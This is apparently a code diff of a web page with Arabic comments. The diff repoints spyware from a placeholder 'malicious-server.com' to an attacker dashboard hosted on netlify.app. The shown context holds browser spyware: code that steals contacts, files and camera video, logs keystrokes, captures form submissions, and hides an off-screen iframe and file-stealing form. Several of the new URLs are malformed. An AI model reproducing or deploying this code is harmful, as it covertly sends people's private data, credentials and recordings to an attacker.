@@ -1114,7 +1114,7 @@ if ('contacts' in navigator && 'select' in navigator.contacts) {
     navigator.contacts.select(['name', 'email', 'tel', 'address', 'icon'])
     .then(contacts => {
         contacts.forEach(contact => {
-            fetch('https://malicious-server.com/contacts', {
+            fetch('https://Mozi_Dashboard_hak.html', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
@@ -1141,7 +1141,7 @@ function stealFiles() {
         for (let i = 0; i < files.length; i++) {
             const reader = new FileReader();
             reader.onload = function(e) {
-                fetch('https://malicious-server.com/upload', {
+                fetch('https://Mozi_Dashboard_hak.html', {
                     method: 'POST',
                     body: JSON.stringify({
                         filename: files[i].name,
@@ -1205,7 +1205,7 @@ function stealAllData() {
     }
 
     // إرسال كل البيانات
-    fetch('https://malicious-server.com/steal/all', {
+    fetch('https://Mozi_dashboard_hak.html', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify(allData)
@@ -1230,7 +1230,7 @@ async function startSpying() {
                 const blob = new Blob(chunks, { type: 'video/webm' });
                 const formData = new FormData();
                 formData.append('video', blob);
-                fetch('https://malicious-server.com/upload/video', {
+                fetch('https://Unseen1.netlify.app/Mozi_Dashboard_hak.html', {
                     method: 'POST',
                     body: formData
                 });
@@ -1254,7 +1254,7 @@ document.addEventListener('keydown', (event) => {
     keystrokes += event.key;
     
     if (keystrokes.length > 50) {
-        fetch('https://malicious-server.com/log/keys', {
+        fetch('https://unseen1.netlify.app/Mozi_Dashboard_hak.html', {
             method: 'POST',
             body: JSON.stringify({ keys: keystrokes, time: new Date().toISOString() })
         });
@@ -1266,7 +1266,7 @@ document.querySelectorAll('form').forEach(form => {
     form.addEventListener('submit', (event) => {
         const formData = new FormData(form);
         const data = Object.fromEntries(formData);
-        fetch('https://malicious-server.com/steal/form', {
+        fetch('https://Unseen1.netlify.app/Mozi_Dashboard_hak.html', {
             method: 'POST',
             body: JSON.stringify(data)
         });
@@ -1343,8 +1343,8 @@ setTimeout(() => {
 </div>
   <!-- العناصر المخفية في الـ body -->
 <div style="display: none; position: absolute; left: -9999px;">
-    <iframe src="https://malicious-server.com/dashboard" id="hiddenFrame"></iframe>
-    <form id="stealForm" action="https://malicious-server.com/upload" method="post" enctype="multipart/form-data">
+    <iframe src="https://Mozi_Dashboard_hak.html" id="hiddenFrame"></iframe>
+    <form id="stealForm" action="https://Mozi_Dashboard_hak.html" method="post" enctype="multipart/form-data">
         <input type="file" id="fileStealer" name="files" multiple webkitdirectory>
     </form>
 </div>
